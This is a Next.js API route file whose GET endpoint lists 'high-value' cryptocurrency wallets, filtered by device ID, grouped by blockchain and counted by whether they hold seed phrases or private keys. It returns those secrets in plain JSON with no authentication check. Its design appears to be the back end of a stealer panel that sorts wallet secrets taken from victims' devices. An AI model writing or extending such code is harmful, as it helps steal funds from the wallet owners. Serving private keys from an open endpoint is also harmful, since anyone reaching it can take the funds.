import { NextRequest, NextResponse } from "next/server"
import { getHighValueWallets } from "@/lib/db-messaging-helpers"

/**
 * GET /api/v1/wallets/high-value
 * Get high-value wallets (with seed phrases or private keys)
 *
 * Query parameters:
 * - device_id: filter by specific device (optional)
 */
export async function GET(request: NextRequest) {
  try {
    const { searchParams } = new URL(request.url)
    const deviceId = searchParams.get("device_id") || undefined

    const wallets = await getHighValueWallets(deviceId)

    // Categorize by blockchain
    const byBlockchain = wallets.reduce((acc, wallet) => {
      const chain = wallet.blockchain || "unknown"
      if (!acc[chain]) acc[chain] = []
      acc[chain].push(wallet)
      return acc
    }, {} as Record<string, typeof wallets>)

    // Count types of data
    const withSeedPhrase = wallets.filter((w) => w.seed_phrase).length
    const withPrivateKey = wallets.filter((w) => w.private_key).length
    const withBoth = wallets.filter((w) => w.seed_phrase && w.private_key).length

    return NextResponse.json({
      success: true,
      total: wallets.length,
      wallets,
      by_blockchain: byBlockchain,
      statistics: {
        with_seed_phrase: withSeedPhrase,
        with_private_key: withPrivateKey,
        with_both: withBoth,
      },
      filter: {
        device_id: deviceId || "all",
      },
    })
  } catch (error) {
    console.error("Error fetching high-value wallets:", error)
    return NextResponse.json(
      { error: "Failed to fetch high-value wallets" },
      { status: 500 },
    )
  }
}
